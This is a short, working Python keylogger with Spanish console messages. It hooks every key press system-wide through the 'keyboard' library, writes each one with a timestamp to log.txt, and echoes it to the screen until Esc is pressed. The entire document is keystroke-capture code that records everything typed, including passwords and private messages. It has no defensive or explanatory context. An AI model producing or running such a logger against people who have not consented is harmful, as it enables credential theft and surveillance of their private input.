import keyboard
import time
import os
keylogger_file = "log.txt"
def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        key_name = event.name
        log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Tecla: '{key_name}'\n"
        if len(key_name) > 1:
            log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{key_name.upper()}]\n"
        print(f"Registrando: {log_entry.strip()}") 
        try:
            with open(keylogger_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
            print(f"[!] Error al escribir en el archivo de log: {e}")

def main():
    print(f"Keylogger iniciado. Presiona 'Esc' para detener.")
    print(f"Los logs se guardarán en: {os.path.abspath(keylogger_file)}")
    try:
        keyboard.hook(on_key_event)
        keyboard.wait('esc')
    except KeyboardInterrupt:
        print("\n[!] Detención por interrupción de teclado (Ctrl+C).")
    except Exception as e:
        print(f"\n[!] Ocurrió un error: {e}")
    finally:
        keyboard.unhook_all()
        print("Keylogger detenido. Revisar el archivo de log.")
if __name__ == "__main__":
    main()
